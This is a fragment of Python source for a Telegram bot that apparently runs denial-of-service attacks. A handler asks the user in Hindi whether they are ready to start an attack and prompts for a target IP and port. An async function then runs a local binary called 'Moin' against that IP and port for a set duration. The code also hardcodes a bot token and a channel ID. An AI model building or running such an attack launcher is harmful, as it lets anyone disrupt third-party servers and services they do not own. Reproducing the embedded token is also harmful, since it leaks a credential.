...
TOKEN = "7850332533:AAEXNz67Eh0pqbrM8RpS9Yt_KRndzVgjx44"
FORWARD_CHANNEL_ID = -1002431196846
...
def handle_attack_command(message):
    ...
    bot.send_message(message.chat.id, "💣 अटैक शुरू करने के लिए तैयार?\n"
                                      ...
                                      "उदाहरण: `167.67.25 6296 ` 🔥", parse_mode='Markdown')
...
async def run_attack_command_async(target_ip, target_port, duration):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./Moin {target_ip} {target_port} {duration} {900}",
